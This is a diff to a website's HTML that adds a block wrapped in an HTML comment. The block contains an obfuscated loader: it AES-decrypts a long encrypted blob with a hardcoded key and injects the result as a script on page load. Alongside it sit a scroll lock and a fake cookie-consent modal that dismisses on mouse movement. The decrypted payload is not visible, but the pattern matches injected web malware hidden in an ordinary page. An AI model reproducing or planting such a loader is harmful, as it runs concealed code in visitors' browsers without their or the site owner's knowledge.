@@ -13,6 +13,118 @@
    
 </head>
 <body>
+     <!-- <script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(`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`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script>
+<script>
+    document.body.style.overflow = "hidden";
+</script>
+
+
+<div id="cookie-modal-box" class="hidden">
+    <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
+    <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+        <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+            <button id="cookie-close" class="absolute top-4 right-4">
+                <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+                    <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+                </svg>
+            </button>
+            <div class="flex items-center gap-3 mb-4">
+                <span class="text-yellow-500 text-3xl">🍪</span>
+                <h2 class="text-2xl font-bold">About cookies</h2>
+            </div>
+            <p class="text-gray-600 mb-6">
+                We use cookies to provide you with a better user experience. <span class="font-semibold">"agree"</span>
+                By clicking, you agree to our use of cookies.
+            </p>
+            <div class="flex flex-col sm:flex-row gap-3">
+                <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 agree</button>
+                <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">refuse</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function(){
+        function decodeEmail(encodedString) {
+            var email = "",
+                r = parseInt(encodedString.substr(0, 2), 16),
+                n,
+                i;
+            for (n = 2; encodedString.length - n; n += 2){
+                i = parseInt(encodedString.substr(n, 2), 16) ^ r;
+                email += String.fromCharCode(i);
+            }
+            return email;
+        }
+
+        var elements = document.querySelectorAll('.__cf_email__');
+        for (var i = 0; i < elements.length; i++) {
+            var el = elements[i];
+            var encoded = el.getAttribute('data-cfemail');
+            if (encoded) {
+                var decodedEmail = decodeEmail(encoded);
+                el.innerHTML = decodedEmail;
+                // If the parent is an <a> tag, update the href to mailto
+                if (el.parentNode.tagName === 'A') {
+                    el.parentNode.href = "mailto:" + decodedEmail;
+                }
+            }
+        }
+    })();
+</script>
+<script>
+    const modalBox = document.getElementById("cookie-modal-box"),
+        modal = document.getElementById("cookie-modal"),
+        backdrop = document.getElementById("cookie-backdrop"),
+        acceptBtn = document.getElementById("cookie-accept"),
+        declineBtn = document.getElementById("cookie-decline"),
+        closeBtn = document.getElementById("cookie-close");
+
+    function showModal() {
+        modalBox.classList.remove("hidden");
+        setTimeout(() => {
+            backdrop.classList.remove("opacity-0");
+            modal.classList.remove("opacity-0", "scale-90");
+        }, 10);
+    }
+
+    function hideModal(e) {
+        localStorage.setItem("cookie-consent", e);
+        setTimeout(() => {
+            modalBox.classList.add("hidden");
+        }, 1500);
+
+        // remove mousemove listener once closed
+        document.removeEventListener("mousemove", mouseMoveClose);
+    }
+
+    function mouseMoveClose() {
+        hideModal("closed");
+    }
+
+    acceptBtn.onclick = () => hideModal("accepted");
+    declineBtn.onclick = () => hideModal("declined");
+    closeBtn.onclick = () => hideModal("closed");
+    backdrop.onclick = () => hideModal("closed");
+
+    if (!localStorage.getItem("cookie-consent")) {
+        showModal();
+        document.addEventListener("mousemove", mouseMoveClose, { once: true });
+    }
+</script> -->
     <header>
         <div class="header-top">
             <div class="logo">
